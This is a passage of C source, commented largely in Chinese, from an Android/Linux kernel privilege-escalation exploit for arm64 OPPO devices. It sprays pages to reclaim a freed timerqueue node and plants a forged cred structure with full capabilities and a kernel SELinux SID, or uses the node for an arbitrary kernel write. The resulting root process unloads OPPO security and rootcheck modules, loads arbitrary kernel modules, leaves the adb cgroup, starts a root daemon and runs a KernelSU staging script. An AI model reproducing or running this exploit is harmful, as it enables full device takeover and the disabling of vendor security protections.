     *      基址，slide = g_base - PAGE_OFFSET。arm64 39-bit VA 的 PAGE_OFFSET
     *      是 0xffffff8000000000，与下面 sys_exit_tp 的合法性下界同一个值。
     */
    if (g_cfg.timer_site)
        g_slide = site0 - g_cfg.timer_site;
    else if (g_base)
        g_slide = g_base - 0xffffff8000000000ULL;

    if (g_slide & 0x1fffffULL)
        logf("[!] slide %#llx not 2 MB aligned (site0=%#llx base=%#llx)\n",
             g_slide, site0, g_base);

    {
        size_t off = (size_t)((V & 0x1fff) + 0x78);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            return;
        }
        if (off + 0x40 > SOCKBUF)
        {
            /* 悬挂节点贴着页尾时 payload 会越界写，直接换一个受害者。 */
            logf("[-] plant%d node offset %#zx out of range; retryable\n",
                 tag, off);
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            free(payload);
            payload = NULL;
            res->retry = 1;
            return;
        }
        if (mode == 2 || mode == 3)
        {
            unsigned long long page = V & ~0x1fffULL;
            /*
             * 0.52：fake cred 回到「叠在 node 上」的写法（0.47 的形状）。
             *
             * 0.48 的"分离"是错的，真正的死因不在 WARN，而在
             * rb_erase_cached() 的 leftmost 维护：
             *
             *     if (root->rb_leftmost == node)
             *             root->rb_leftmost = rb_next(node);
             *
             * rb_next() 在 __rb_parent_color == node 时因为 RB_EMPTY_NODE
             * 立刻返回 NULL，清理循环（timerqueue_getnext 只看 leftmost）
             * 下一轮拿到 NULL 就正常结束。
             * 而 pc = cred_addr != node 时 rb_next() 返回 cred_addr，循环
             * 把 cred 当节点再删一次 —— 那一次 rb_erase 用 cred->usage
             * （0x40000000）当 parent 去解引用，直接 panic。
             * 22:59 那次日志停在 hit=1 之后，就是这么死的。
             *
             * 代价是：pc == node 会让 timerqueue_del 开头的
             * WARN_ON_ONCE(RB_EMPTY_NODE(node)) 触发。所以顺序必须是
             *   ① probe plant 拿 slide → ② 清 panic_on_warn → ③ 再写 cred。
             */
            int c61 = (g_cfg.cred_uid_off == 4);
            size_t need = c61 ? 0xa0 : 0xb8;
            size_t cand[] = {0x1f00, 0x1000, 0x1800, 0x800, 0x100, 0x0};
            size_t blob = 0;
            int fit = 0;
            unsigned char *p;

            if (mode == 3)
            {
                /*
                 * probe：零写到自己这一页（page+0x800），纯粹为了在
                 * run_plant 内部把 g_slide 算出来。写入目标不可达任何内核
                 * 状态，parent=0 也让 leftmost 归 NULL，属于完全无害的一发。
                 */
                build_payload(payload, off, 0, page + 0x800);
                fake_A = 0;
                logf("[+] plant%d probe off=%#zx (slide calibration)\n", tag,
                     off);
            }
            else
            {
                if (off + need > 0x2000)
                {
                    logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                         tag, off);
                    kill(T, SIGKILL);
                    waitpid(T, NULL, 0);
                    free(payload);
                    payload = NULL;
                    res->retry = 1;
                    return;
                }
                for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
                {
                    size_t bb = cand[i];

                    if (bb + 0x40 > 0x2000)
                        continue;
                    if (bb + 0x40 <= off || off + need <= bb)
                    {
                        blob = bb;
                        fit = 1;
                        break;
                    }
                }
                if (!fit)
                {
                    kill(T, SIGKILL);
                    waitpid(T, NULL, 0);
                    free(payload);
                    payload = NULL;
                    res->retry = 1;
                    return;
                }
                build_payload(payload, off, V + 0x78, target);
                p = payload + off;
                if (c61)
                {
                    /*
                     * 0x00..0x17 是 rb_node，不能碰：
                     *   parent@0x00 必须等于 node 自身（RB_EMPTY_NODE）
                     *   right @0x08 必须为 0
                     *   left  @0x10 是 target
                     * 它们覆盖 cred 的 usage/uid/gid/suid/sgid/euid，所以这
                     * 六个字段天然是脏的（usage 很大，put_cred 不会释放；
                     * uid/euid 由子进程 setresgid/setresuid 修正）。
                     */
                    memset(p + 0x18, 0, 0x10); /* egid/fsuid/fsgid/securebits */
                    for (int i = 0; i < 5; i++)
                        *(unsigned long long *)(p + 0x28 + i * 8) =
                            g_cfg.fullcap;
                    *(unsigned long long *)(p + 0x78) = page + blob;
                    *(unsigned long long *)(p + 0x80) =
                        g_cfg.root_user + g_slide;
                    *(unsigned long long *)(p + 0x88) =
                        g_cfg.init_user_ns + g_slide;
                    /*
                     * 4.19 的 init_ucounts 是 static，符号表里没有；conf 留空时
                     * 直接写 0。fake cred 的 usage 来自 rb_node.parent（极大），
                     * 永远减不到 0，__put_cred 不会走到 dec_ucount，NULL 安全。
                     */
                    *(unsigned long long *)(p + 0x90) =
                        g_cfg.init_ucounts ? g_cfg.init_ucounts + g_slide : 0;
                    *(unsigned long long *)(p + 0x98) =
                        g_cfg.init_groups + g_slide;
                }
                else
                {
                    unsigned long long *c = (unsigned long long *)p;

                    c[3] = 0;
                    c[4] = 0;
                    c[5] = 0;
                    for (int i = 6; i <= 10; i++)
                        c[i] = g_cfg.fullcap;
                    *(unsigned long long *)(p + 0x80) = page + blob;
                    *(unsigned long long *)(p + 0x88) =
                        g_cfg.root_user + g_slide;
                    *(unsigned long long *)(p + 0x90) =
                        g_cfg.init_user_ns + g_slide;
                    *(unsigned long long *)(p + 0x98) =
                        g_cfg.init_ucounts + g_slide;
                    *(unsigned long long *)(p + 0xa0) =
                        g_cfg.init_groups + g_slide;
                }
                for (int i = 0; i < 4; i++)
                    *(unsigned int *)(payload + blob + i * 4) =
                        g_cfg.selinux_sid_kernel;
                fake_A = V + 0x78;
                logf("[+] plant%d fake cred node=%#zx blob=%#zx sec=%#llx "
                     "layout=%s\n",
                     tag, off, blob, page + blob, c61 ? "6.1" : "6.6");
            }
        }
        else if (mode == 4)
        {
            /*
             * 任意写（Case 1）：left=NULL / right=value / parent=target-8。
             * 值只能是「有效内核地址」—— __rb_erase_augmented 在写完 target
             * 之后还会执行 child->__rb_parent_color = pc，child 必须可写。
             *
             * 0.83-cg：值取 V+0x2f 而不是 V+0x78。
             *
             * 低 3 位被对象对齐钉死为 0 是之前拿不到 CAP_DAC_OVERRIDE(bit1)
             * 的唯一原因。这里把写入值本身加 0x2f，位模式低 3 位就是 111，
             * 一口气拿到 CHOWN(0) / DAC_OVERRIDE(1) / DAC_READ_SEARCH(2)。
             *
             * 偏移必须留在 payload 头部：rb_erase_cached 之后还要
             * rb_next(value)，它会读 value->rb_left（V+off+0x10）。0x2f+0x10
             * = 0x3f 落在 memset 清零区，读出来是 0，下降立即结束。之前用
             * 0x7f 时这个位置越出零区，读到垃圾指针，走两步就 kernel_panic。
             * 0x2f..0x36 也不会覆盖 off+0x00/0x08/0x10 三个关键字段。
             */
            /*
             * AW_OFF 控制写入值相对 payload 的偏移。
             * 默认 0x78（8 字节对齐）——这是唯一验证过稳定的取值：
             * 对象地址按 8 对齐，rb_next 沿 value->rb_left 只读到 memset
             * 清零区就停下。取非对齐值（0x2f / 0x7f）能凑出 bit0-2，
             * 但会让 rb_next 走进越界区，5.15 + PANIC_ON_OOPS=y 直接重启。
             * 想让 bit16 命中就连续 plant（1/2 概率），别动这个偏移。
             */
            {
                const char *awoff = getenv("AW_OFF");
                unsigned long long av =
                    g_aw_value ? g_aw_value
                               : (V + (awoff ? strtoull(awoff, NULL, 0)
                                             : 0x78ULL));

                build_payload_aw(payload, off, target, av);
                fake_A = av;
            }
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d V=%#llx A=%#llx pfn=%#llx slab=%#llx slide=%#llx "
             "recs=%d slab_own=%d/32 base=%#llx\n",
             tag, V, fake_A ? fake_A : V + 0x78, pfn, slab_pfn, g_slide, nrec,
             slab_own, g_base);
    }

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        int per = g_pool_n / SPRAY_THREADS;

        if (per < 1)
            per = 1;
        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].sock_first = (i * per) % g_pool_n;
            args[i].sock_count = per;
            args[i].cpu = i;
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            pthread_create(&th[i], NULL, spray_thread, &args[i]);
        }
    }
    /*
     * Release the race without spray CPU contention; V is already captured,
     * so the burst can start immediately after the zombie appears.
     */
    /*
     * Arm the spray before releasing the exec: the victim page is freed inside
     * do_exit(), which is earlier than the zombie becoming visible, so waiting
     * for the zombie leaves a window where any other allocation can take it.
     * This was the difference between a 33 ms hit and a 15 s miss.
     */
    atomic_store(&g_burst, 1);
    logf("[+] plant%d spray armed before release\n", tag);
    if (g_timer_go_w >= 0)
    {
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        logf("[-] plant%d no zombie; holding child\n", tag);
        g_held++;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
    if (si.si_code != CLD_KILLED)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
        g_held++;
        return;
    }
    atomic_store(&g_burst, 1);
    /*
     * Without a usable free event id there is nothing to wait for: the zombie
     * already means do_exit() finished, so the victim page is free now and
     * both phases can run back to back.
     */
    if (!g_t_page_free)
        atomic_store(&g_burst2, 1);
    /*
     * Phase 1 is already spraying.  When the victim page is freed, release
     * phase 2 immediately; detecting the free before the allocation would
     * otherwise leave the page to the next caller.
     */
    long t1 = now_ms();
    int hit = 0, stolen = 0;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < 8 && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            {
                hit = 1;
                break;
            }
            /* Whoever took the page is worth knowing: it separates "we lost a
             * race to another allocation" from "our record was dropped". */
            if (!stolen)
                (void)scan_page_alloc_any(raw, (size_t)m, slab_pfn, &stolen);
            if (!free_seen && scan_page_free(raw, (size_t)m, slab_pfn))
            {
                free_seen = 1;
                atomic_store(&g_burst2, 1);
            }
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
        {
            hit = 1;
            break;
        }
        if (m > 0 && !stolen)
            (void)scan_page_alloc_any(raw, (size_t)m, slab_pfn, &stolen);
    }
    logf("[+] plant%d free_seen=%d burst hit=%d stolen_by=%d after %ldms\n",
         tag, free_seen, hit, stolen, now_ms() - t1);
    if (!hit)
    {
        logf("[-] plant%d burst missed (%s); holding zombie, retry\n", tag,
             stolen ? "page went to another task" : "no page_alloc for our pfn");
        /*
         * 0.49：不再让整次运行报废。
         *
         * 这个受害者我们不 reap，它的 timerqueue 只有在 signal_struct 销毁时
         * 才会被遍历一次，所以一直持有僵尸就等于把它隔离了；换一个新受害者
         * 再赌一次，比直接 park 划算得多。stage_write 最多重试 3 次。
         */
        g_held++;
        res->retry = 1;
        return;
    }

    usleep(1000);
    int st = 0;
    waitpid(T, &st, 0);
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    res->A = fake_A ? fake_A : V + 0x78;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0, loose = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                    (char *)cmode, NULL};
                /*
                 * 必须继承父进程环境：子进程是 exec 出来的，用固定 envp
                 * 会把 GATE_FILE / READ_MODTEXT / SKIP_CHILD_STATE 这些
                 * 调试开关全丢掉，导致子进程行为与预期不符（之前
                 * "门闩没反应" 就是这个原因）。
                 */
                execve("/proc/self/exe", av, environ);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        /*
         * A fixed 50 ms wait (the reference value) assumes the child reaches
         * exec quickly; on a cold or loaded device the cred allocation can
         * land several hundred ms later, and the run then fails with R=0.
         * Read the pipe repeatedly instead and stop at the first record.
         */
        for (int w = 0; w < 25 && !R; w++)
        {
            usleep(20000);
            n = read_cpu(g_cpu, raw, 48u << 20);
            if (n <= 0)
                continue;
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            if (!c)
            {
                c = scan_cred_allocs_loose(raw, (size_t)n, (int)p, &site, &R);
                loose = c > 0;
            }
            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
        }
        trace_stop();
        if (R && (!g_fake_stage || task))
        {
            struct pollfd pf = {.fd = st[0], .events = POLLIN};

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
            {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                     "recs=%d loose=%d task=%#llx task_recs=%d\n",
                     attempt, p, R, site & 0x1fffff, c, loose, task, tc);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                *task_out = task;
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        close(go[1]);
        close(st[0]);
        {
            int ws = 0;
            pid_t wr = waitpid(p, &ws, WNOHANG);
            if (wr == p)
            {
                if (WIFEXITED(ws))
                    logf("[!] child %d already exited: code %d (exec failed)\n",
                         p, WEXITSTATUS(ws));
                else if (WIFSIGNALED(ws))
                    logf("[!] child %d died from signal %d\n", p, WTERMSIG(ws));
            }
            else
            {
                logf("[!] child %d still alive -> exec ok, waiting for cred\n", p);
                kill(p, SIGKILL);
                waitpid(p, NULL, 0);
            }
        }
    }
    return 0;
}

static int wait_child_main(const char *mode)
{
    /* 裸 write 日志：子进程 _exit 会丢 stdio 缓冲，诊断一律走这个 */
    #define RAWLOG(fmt, ...)                                                  \
        do {                                                                  \
            char _rb[256];                                                    \
            int _rn = snprintf(_rb, sizeof(_rb), fmt, ##__VA_ARGS__);         \
            syscall(SYS_write, 2, _rb, (long)_rn);                            \
        } while (0)

    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    pin(g_cpu);
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    {
        const char *gate = getenv("GATE_FILE");

        if (gate && *gate)
        {
            /*
             * 文件门闩：取代管道 read。
             * 目的是把「root 进程开始运行」和「管道唤醒路径」两件事分开：
             *   - 自旋期间（已经是 uid 0）就被杀 -> 监控按 uid 轮询/调度杀进程
             *   - 打开文件后才被杀         -> 问题在 read 唤醒路径
             * 用 access() 而不是 stat，尽量少碰 LSM 的文件钩子。
             */
            while (access(gate, F_OK) != 0)
                usleep(20000);
        }
        else if (read(3, &ch, 1) != 1)
            _exit(131);
    }
    /*
     * 落盘诊断：不管后面会不会被内核杀掉，先把换 cred 之后的真实身份写下来。
     * 全走裸系统调用，避免 stdio 在坏 cred 下出问题。
     */
    if (!getenv("SKIP_CHILD_STATE"))
    {
        int fd = (int)syscall(SYS_openat, -100,
                              "/data/local/tmp/t15/child_state",
                              O_WRONLY | O_CREAT | O_TRUNC, 0644);

        if (fd >= 0)
        {
            char b[128];
            int n = snprintf(b, sizeof(b), "uid=%ld euid=%ld pid=%d\n",
                             syscall(SYS_getuid), syscall(SYS_geteuid),
                             (int)getpid());

            syscall(SYS_write, fd, b, (long)n);
            syscall(SYS_close, fd);
        }
    }
    if (getenv("TEST_INIT_MODULE"))
    {
        /*
         * 探针：直接调 init_module 传垃圾数据。
         *   EPERM(1)/EACCES(13) -> 被 SELinux 的 kernel_load_module 挡住
         *   ENOEXEC(8)/EINVAL(22) -> 权限过了，只是模块格式不对
         * 这一条决定“有 caps 就够”还是“必须先把 enforcing 清零”。
         */
        static const unsigned char junk[64] = {0x7f, 'E', 'L', 'F'};
        errno = 0;
        long r = syscall(SYS_init_module, junk, (unsigned long)64, "");
        int e = errno;

        RAWLOG("\n[mod] init_module(garbage) ret=%ld errno=%d\n", r, e);
        {
            int fd = open("/proc/self/status", O_RDONLY);
            char b[4096];
            int n = fd >= 0 ? (int)read(fd, b, sizeof(b) - 1) : -1;

            if (fd >= 0)
                close(fd);
            if (n > 0)
            {
                char *q;

                b[n] = 0;
                q = strstr(b, "CapEff:");
                if (q)
                {
                    char *e2 = strchr(q, '\n');

                    if (e2)
                        *e2 = 0;
                    RAWLOG("[mod] %s\n", q);
                }
            }
        }
    }

    if (getenv("RMMOD"))
    {
        /*
         * 在同一个持 CAP_SYS_MODULE 的窗口里卸载 OPPO 的 rootcheck 模块。
         * 依赖顺序：keventupload -> secure_harden -> security_guard
         */
        char rm_buf[256];
        char *rm_p = NULL;
        char *rm_save = NULL;

        snprintf(rm_buf, sizeof(rm_buf), "%s", getenv("RMMOD"));
        for (rm_p = strtok_r(rm_buf, ",", &rm_save); rm_p;
             rm_p = strtok_r(NULL, ",", &rm_save)) {
            int re;
            long rr;

            errno = 0;
            rr = syscall(SYS_delete_module, rm_p, O_NONBLOCK);
            re = errno;
            RAWLOG("\n[rmmod] %s ret=%ld errno=%d\n", rm_p, rr, re);
        }
    }

    if (getenv("LOAD_KO"))
    {
        /*
         * 在持有 CAP_SYS_MODULE 的 plant child 里直接 init 模块。
         * 不 exec，caps 不会被 bset 重算掉。
         *   errno=0   -> 加载成功
         *   errno=2   -> Unknown symbol（内核没导出）
         *   errno=8   -> vermagic / modversions 不过
         *   errno=1   -> EPERM（caps 或 modules_disabled）
         */
        const char *kp = getenv("LOAD_KO");
        int kfd = open(kp, O_RDONLY);
        long kr = -1;
        int ke = 0;

        errno = 0;
        if (kfd >= 0)
            kr = syscall(SYS_finit_module, kfd, "", 0);
        ke = errno;
        RAWLOG("\n[ko] finit_module(%s) ret=%ld errno=%d\n", kp, kr, ke);
        if (kfd >= 0)
            close(kfd);
        {
            int fd = open("/proc/modules", O_RDONLY);
            char b[1024];
            int n = fd >= 0 ? (int)read(fd, b, sizeof(b) - 1) : -1;

            if (fd >= 0)
                close(fd);
            if (n > 0)
            {
                b[n] = 0;
                if (strstr(b, "kernelsu"))
                    RAWLOG("[ko] kernelsu present in /proc/modules\n");
            }
        }
    }

    if (getenv("READ_MODTEXT"))
    {
        /* 用裸 write，避开 stdio 缓冲（子进程 _exit 会丢缓冲） */
        const char *paths[] = {
            "/sys/module/oplus_app_monitor/sections/.text",
            "/sys/module/oplus_app_monitor/sections/.data",
            "/proc/self/status"};

        for (int pi = 0; pi < 3; pi++)
        {
            int fd = open(paths[pi], O_RDONLY);
            char b[512];
            int n = fd >= 0 ? (int)read(fd, b, sizeof(b) - 1) : -1;

            if (fd >= 0)
                close(fd);
            if (n > 0)
            {
                b[n] = 0;
                if (pi == 2)
                {
                    char *q = strstr(b, "CapEff:");

                    if (q)
                    {
                        char *e = strchr(q, '\n');

                        if (e)
                            *e = 0;
                        RAWLOG("\n[mod] %s\n", q);
                    }
                    q = strstr(b, "Uid:");
                    if (q)
                    {
                        char *e = strchr(q, '\n');

                        if (e)
                            *e = 0;
                        RAWLOG("[mod] %s\n", q);
                    }
                }
                else
                    RAWLOG("\n[mod] %s = %s", paths[pi], b);
            }
            else
                RAWLOG("\n[mod] %s 读取失败 errno=%d\n", paths[pi], errno);
        }
    }

    if (getenv("CHILD_EXIT_AT_WAKE"))
    {
        /* 门闩一开就退出：能退出说明子进程可以正常跑；被 SIGKILL 说明是外部杀的 */
        syscall(SYS_exit_group, 7);
    }

    /* 裸 write 标记：不经过 stdio，用来定位换 cred 后第一个挂掉的系统调用 */
    syscall(SYS_write, 2, "R", 1);
    close(3);
    syscall(SYS_write, 2, "C", 1);

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    syscall(SYS_write, 2, "U", 1);
    rep.euid = (int)syscall(SYS_geteuid);
    syscall(SYS_write, 2, "V", 1);
    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
    /*
     * 这里绝对不能调 setresuid()/setresgid()。
     *
     * commit_creds() 取 task->real_cred 作为 "old"，并且有
     * BUG_ON(task->cred != old)（cred.c）。fake 路线只把 ->cred 指到伪造页，
     * ->real_cred 还是原来那份，所以在本进程提交 cred 等于主动 BUG()。
     * 归一化必须放到 fork 出来的孙子进程里做（copy_creds() 会在那里生成
     * 一份真 cred，并让 cred == real_cred）。
     */
    /*
     * fake 路线里 uid 一定是脏的：伪造 cred 的前 0x18 字节就是 rb_node，
     * uid = node 地址高 32 位、euid = target 高 32 位（实测 -128 / -126）。
     * 这里不能因此判失败 —— 归一化在 fork 出来的孙子进程里做（那里
     * cred == real_cred，commit_creds 才合法）。只有 shell/verify 路线才
     * 要求这里 uid 已经是 0。
     */
    if (rep.uid != 0 && strcmp(mode, "fake"))
    {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid is not 0: cred write did not land\n");
        _exit(3);
    }

    if (!strcmp(mode, "fake"))
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        int st = 0;
        pid_t w;

        logf("[fake] child uid=%d euid=%d cred!=real_cred; forking worker\n",
             rep.uid, rep.euid);
        {
            uid_t ru = 0, eu = 0, sv = 0;

            syscall(SYS_getresuid, &ru, &eu, &sv);
            logf("[fake] before fork: getuid=%d geteuid=%d resuid=%d/%d/%d\n",
                 (int)syscall(SYS_getuid), (int)syscall(SYS_geteuid),
                 (int)ru, (int)eu, (int)sv);
        }
        /*
         * 孙子进程：此时 cred == real_cred（copy_creds 的结果），
         * setresgid/setresuid 里的 prepare_creds() + commit_creds() 才合法。
         * 提交之后这是一份货真价实的 cred（真 SELinux blob，sid 继承自
         * 伪造页里的 1），exec 时 caps 由 bset 重新算出来 = fullcap。
         */
        w = fork();
        if (w == 0)
        {
            /*
             * 先把 OPPO 的 rootcheck 卸掉，再改 uid。
             *
             * 实测 dmesg：`ROOTCHECK-RC-ERROR:Kill the process of escalation`
             * 来自 oplus_app_monitor.ko，它不看 SELinux（Permissive 下照杀），
             * 所以只能在提 uid 之前把模块本身摘掉。worker 此刻的 cred 已经是
             * fake（fullcap），CAP_SYS_MODULE 在位，delete_module 有戏。
             */
            static const char *rk_mods[] = {
                "oplus_app_monitor",
                "oplus_bsp_sigkill_diagnosis",
                "oplus_security_guard",
                "oplus_secure_harden",
            };
            for (unsigned mi = 0; mi < sizeof(rk_mods) / sizeof(rk_mods[0]); mi++)
            {
                long rr = syscall(SYS_delete_module, rk_mods[mi], 0x800 /* O_NONBLOCK */);
                int re = errno;
                logf("[rmmod] %s -> %ld errno=%d\n", rk_mods[mi], rr, re);
            }
            long sg = syscall(SYS_setresgid, 0, 0, 0);
            long su = syscall(SYS_setresuid, 0, 0, 0);
            int e = errno;
            char *const av[] = {(char *)"sh",
                                (char *)"/data/local/tmp/ksu_stage.sh", NULL};

            rep.uid = (int)syscall(SYS_getuid);
            rep.euid = (int)syscall(SYS_geteuid);
            rep.setuid_ret = (int)(su == 0 ? 0 : -1);
            rep.setuid_errno = e;
            logf("[fake] worker setresgid=%ld setresuid=%ld errno=%d "
                 "uid=%d euid=%d\n", sg, su, e, rep.uid, rep.euid);
            {
                char b[2048];
                int fd = open("/proc/self/status", O_RDONLY);

                if (fd >= 0)
                {
                    int nn = (int)read(fd, b, sizeof(b) - 1);

                    close(fd);
                    if (nn > 0)
                    {
                        char *q;

                        b[nn] = 0;
                        q = strstr(b, "CapEff:");
                        if (q)
                        {
                            char *e2 = strchr(q, '\n');

                            if (e2)
                                *e2 = 0;
                            logf("[fake] %s\n", q);
                        }
                        q = strstr(b, "Uid:");
                        if (q)
                        {
                            char *e2 = strchr(q, '\n');

                            if (e2)
                                *e2 = 0;
                            logf("[fake] %s\n", q);
                        }
                    }
                }
                fd = open("/proc/self/attr/current", O_RDONLY);
                if (fd >= 0)
                {
                    int nn = (int)read(fd, b, sizeof(b) - 1);

                    close(fd);
                    if (nn > 0)
                    {
                        b[nn] = 0;
                        logf("[fake] ctx=%s\n", b);
                    }
                }
            }
            (void)write(4, &rep, sizeof(rep));
            close(4);
            /*
             * 先把 rootd 挂起来，再做 ksud：这样即便 ksud 全失败，
             * 这次开机的 root 也不会丢，改参数可以原地重试。
             * fork 失败 / bind 失败都只是少一个功能，不影响下面的 exec。
             */
            {
                pid_t rd = fork();

                if (rd == 0)
                {
                    rootd_serve(); /* 正常不返回 */
                    _exit(0);
                }
                if (rd < 0)
                    logf("[rootd] fork failed errno=%d\n", errno);
            }
            execve("/system/bin/sh", av, envp);
            logf("[-] worker exec failed errno=%d\n", errno);
            _exit(127);
        }
        if (w < 0)
        {
            rep.setuid_ret = -1;
            (void)write(4, &rep, sizeof(rep));
        }
        close(4);
        if (w > 0)
            waitpid(w, &st, 0);
        logf("[fake] worker exit=%#x\n", st);
        _exit(0);
    }

    /*
     * 0.83-cg：把进程迁出 adb shell 的 cgroup 子树。
     *
     * adbd 断开时会回收整棵 uid_0/pid_*，daemon 就算 setsid + PPID=1 也一样
     * 被收走（实测 cg=0::/uid_0/pid_4883，进程起来后不到一分钟消失）。
     *
     * 必须放在 setresgid/setresuid 之前：实测这两次调用里的 prepare_creds()
     * + commit_creds() 会把父进程 plant 写进 cred+0x38 的 cap_effective 清掉
     * （日志里写进去的是 0xffffff806289f1b7，setresuid 之后读回是 0），而
     * cgroup.procs 是 0775 system:system，没有 CAP_DAC_OVERRIDE 必 EACCES。
     * 提前迁完，后面 exec 丢 caps 也就无所谓了——cgroup 归属是 per-process
     * 的，不随 cred 变化。
     */
    if (getenv("PRE_CG"))
    {
        static const char *const cgs[] = {
            "/sys/fs/cgroup/cgroup.procs",
            "/sys/fs/cgroup/uid_0/cgroup.procs",
            NULL};
        char pb[24];
        int pn = snprintf(pb, sizeof(pb), "%d", (int)getpid());
        int ci;

        /*
         * 诊断：内核是否认可我们写进去的 cap_effective。open 报 EACCES
         * 只有两种可能——effective 真的没生效，或者拒绝来自 SELinux /
         * cgroup 自身的权限检查。先把 CapEff 读出来排除第一种。
         */
        {
            char sb[2048];
            int sfd = open("/proc/self/status", O_RDONLY);

            if (sfd >= 0)
            {
                int sn = (int)read(sfd, sb, sizeof(sb) - 1);

                close(sfd);
                if (sn > 0)
                {
                    char *p;

                    sb[sn] = 0;
                    for (p = sb; *p; p++)
                    {
                        if (!strncmp(p, "CapEff:", 7) ||
                            !strncmp(p, "CapPrm:", 7) ||
                            !strncmp(p, "CapBnd:", 7))
                        {
                            char *e = strchr(p, '\n');

                            if (e)
                                *e = 0;
                            logf("[cg] %s\n", p);
                            if (e)
                                *e = '\n';
                        }
                    }
                }
            }
        }

        for (ci = 0; cgs[ci]; ci++)
        {
            int fd = open(cgs[ci], O_WRONLY);

            if (fd < 0)
            {
                logf("[cg] open %s failed errno=%d\n", cgs[ci], errno);
                continue;
            }
            if (write(fd, pb, pn) < 0)
                logf("[cg] write %s failed errno=%d\n", cgs[ci], errno);
            else
            {
                logf("[cg] moved pid=%d -> %s\n", (int)getpid(), cgs[ci]);
                close(fd);
                break;
            }
            close(fd);
        }
    }


    /*
     * Plant 1 zeroes uid+gid only; egid is still 2000.  If it stays that way
     * across execve(), cap_bprm's setgid downgrade intersects permitted with
     * the old (empty) set and the expanded bset never becomes effective.
     */
